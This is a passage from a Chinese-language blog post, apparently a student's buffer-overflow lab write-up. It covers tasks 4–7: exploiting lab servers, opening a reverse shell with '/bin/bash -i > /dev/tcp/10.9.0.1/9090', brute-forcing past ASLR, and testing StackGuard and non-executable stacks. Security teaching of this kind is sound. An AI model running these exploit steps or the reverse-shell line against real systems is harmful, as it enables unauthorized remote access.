+<p>修改<code>exploit.py</code>文件的shellcode变量：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028202750544.png" srcset="/img/loading.gif" lazyload alt="image-20241028202750544"></p>
+<p>修改shellcode变量为<code>shellcode</code>文件夹中<code>shellcode_64.py</code>文件的shellcode变量；</p>
+<p>修改start变量为0；</p>
+<p>修改ret变量为<code>buffer address</code>，即<code>0x00007fffffffe310</code>；</p>
+<p>修改offset变量为<code>rbp-buffer address+8</code>，即<code>0x00007fffffffe3e0-0x00007fffffffe310+8</code>；</p>
+<p>修改content变量，将之前32位的<code>4</code>，修改为<code>8</code>；</p>
+</li>
+<li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.7 9090</code>语句；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028200837605.png" srcset="/img/loading.gif" lazyload alt="image-20241028200837605"></p>
+<p>server中可以得到返回，可见溢出攻击成功！</p>
+</li>
+<li><p>为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>将发送给10.9.0.7的内容，返回给10.9.0.1，实现反弹shell；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201117195.png" srcset="/img/loading.gif" lazyload alt="image-20241028201117195"></p>
+</li>
+<li><p>在另一个终端监听9090端口；</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201235213.png" srcset="/img/loading.gif" lazyload alt="image-20241028201235213"></p>
+</li>
+<li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201315181.png" srcset="/img/loading.gif" lazyload alt="image-20241028201315181"></p>
+</li>
+<li><p>服务器中显示连接成功；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201401911.png" srcset="/img/loading.gif" lazyload alt="image-20241028201401911"></p>
+</li>
+<li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201426974.png" srcset="/img/loading.gif" lazyload alt="image-20241028201426974"></p>
+</li>
+</ol>
+<p><strong>至此task4完成！</strong></p>
+<hr>
+<h4 id="Task5-Level-4-Attack"><a href="#Task5-Level-4-Attack" class="headerlink" title="Task5: Level-4 Attack"></a>Task5: Level-4 Attack</h4><p><strong>目标服务器及端口：10.9.0.8 9090</strong></p>
+<ol>
+<li><p>先测试一下目标服务器及端口能否连通；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201654875.png" srcset="/img/loading.gif" lazyload alt="image-20241028201654875"></p>
+<p>server端成功返回，测试成功：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201713906.png" srcset="/img/loading.gif" lazyload alt="image-20241028201713906"></p>
+<p>得到了<code>rbp=0x00007fffffffe3e0</code>和<code>buffer address=0x00007fffffffe380</code>；</p>
+<p>对比Level-3，Level-4的rbp和buffer address之间的间隔变小了。若将 ret 的值设为RBP+n ， n 是[1184, 1424]之间的值，取n&#x3D;1200，就能实现缓冲区溢出攻击。</p>
+</li>
+<li><p>修改<code>exploit.py</code>文件如下：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028204437694.png" srcset="/img/loading.gif" lazyload alt="image-20241028204437694"></p>
+<p>修改start变量为<code>517-len(shellcode)</code>；</p>
+<p>修改ret变量为<code>rbp+n</code>，n取一个足够大的数，比如1200，ret变量变为<code>0x00007fffffffe3e0+1200</code>；</p>
+<p>修改offset变量为<code>rbp-buffer address+8</code>，即<code>0x00007fffffffe3e0-0x00007fffffffe380+8</code>；</p>
+<p>注：由于先尝试让服务器简单溢出，所以选择了之前echo 64的代码；</p>
+</li>
+<li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.8 9090</code>语句；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028214626827.png" srcset="/img/loading.gif" lazyload alt="image-20241028214626827"></p>
+<p>server中可以得到返回，可见溢出攻击成功！</p>
+</li>
+<li><p>为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>将发送给10.9.0.8的内容，返回给10.9.0.1，实现反弹shell；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028214715757.png" srcset="/img/loading.gif" lazyload alt="image-20241028214715757"></p>
+</li>
+<li><p>在另一个终端监听9090端口；</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028214804469.png" srcset="/img/loading.gif" lazyload alt="image-20241028214804469"></p>
+</li>
+<li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028214942433.png" srcset="/img/loading.gif" lazyload alt="image-20241028214942433"></p>
+</li>
+<li><p>服务器中显示连接成功；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028215005173.png" srcset="/img/loading.gif" lazyload alt="image-20241028215005173"></p>
+</li>
+<li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028214919940.png" srcset="/img/loading.gif" lazyload alt="image-20241028214919940"></p>
+</li>
+</ol>
+<p><strong>至此task5完成！</strong></p>
+<hr>
+<h4 id="Task6-Experimenting-with-the-Address-Randomization"><a href="#Task6-Experimenting-with-the-Address-Randomization" class="headerlink" title="Task6: Experimenting with the Address Randomization"></a>Task6: Experimenting with the Address Randomization</h4><ol>
+<li><p>打开ALSR(地址空间随机化)；</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /sbin/sysctl -w kernel.randomize_va_space=2<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028215147772.png" srcset="/img/loading.gif" lazyload alt="image-20241028215147772"></p>
+</li>
+<li><p>执行两次对服务器10.9.0.5和10.9.0.7的连接；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028215332105.png" srcset="/img/loading.gif" lazyload alt="image-20241028215332105"></p>
+<p>可以发现无论是32位，还是64位，每次返回的地址都不相同：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028215500517.png" srcset="/img/loading.gif" lazyload alt="image-20241028215500517"></p>
+<p>这使得攻击变得很困难。</p>
+</li>
+<li><p>使用Level-1中反弹shell的<code>exploit.py</code> 代码；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028220327114.png" srcset="/img/loading.gif" lazyload alt="image-20241028220327114"></p>
+</li>
+<li><p>先在另一终端中监听9090端口；</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure>
+
+<p>然后在<code>attack-code</code>文件夹下执行命令进行爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./exploit.c<br>./brute-forth.sh<br></code></pre></td></tr></table></figure>
+
+<p>最终通过23310次，爆破成功：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028231056206.png" srcset="/img/loading.gif" lazyload alt="image-20241028231056206"></p>
+<p>服务器中显示；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028230925916.png" srcset="/img/loading.gif" lazyload alt="image-20241028230925916"></p>
+<p>监听端口反弹shell成功！</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028231306151.png" srcset="/img/loading.gif" lazyload alt="image-20241028231306151"></p>
+</li>
+</ol>
+<p><strong>至此task6完成！</strong></p>
+<hr>
+<h4 id="Task7-Experimenting-with-Other-Countermeasures"><a href="#Task7-Experimenting-with-Other-Countermeasures" class="headerlink" title="Task7: Experimenting with Other Countermeasures"></a>Task7: Experimenting with Other Countermeasures</h4><ol>
+<li><p>进入<code>server-code</code>目录，删除编译过的文件；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028231902836.png" srcset="/img/loading.gif" lazyload alt="image-20241028231902836"></p>
+</li>
+<li><p>编辑<code>Makefile</code>文件，删除<code>-fno-stack-protector</code>选项；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028231940965.png" srcset="/img/loading.gif" lazyload alt="image-20241028231940965"></p>
+<p>重新编译生成可执行文件：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028232049131.png" srcset="/img/loading.gif" lazyload alt="image-20241028232049131"></p>
+</li>
+<li><p>用badfile作为stack-L1的输入；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028232454462.png" srcset="/img/loading.gif" lazyload alt="image-20241028232454462"></p>
+<p>程序运行失败！说明StackGuard保护机制已开启。</p>
+</li>
+<li><p>进入<code>shellcode</code>文件夹，编辑<code>Makefile</code>文件，删除<code>-z execstack</code>选项；</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028232454462.png" srcset="/img/loading.gif" lazyload>重新make一下：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028232851649.png" srcset="/img/loading.gif" lazyload alt="image-20241028232851649"></p>
+</li>
+<li><p>两个输出都无法正常输出：</p>
+<p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028233010780.png" srcset="/img/loading.gif" lazyload alt="image-20241028233010780"></p>
+<p>说明栈不可执行！</p>
+</li>
+</ol>
+<hr>
+<h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/study/" class="category-chain-item">study</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C/" class="print-no-link">#攻防实验</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Lab 4</div>
+      <div>https://r0otsu.github.io/2024/12/25/lab4/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>r0otsu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年12月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/12/25/lab5/" title="Lab 5">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Lab 5</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/12/25/lab3/" title="Lab 3">
+                        <span class="hidden-mobile">Lab 3</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>&nbsp;&nbsp;Hexo</span></a> <i class="iconfont icon-notebook"></i> <a href="https://r0otsu.github.io" target="_blank" rel="nofollow noopener"><span>r0otsu</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
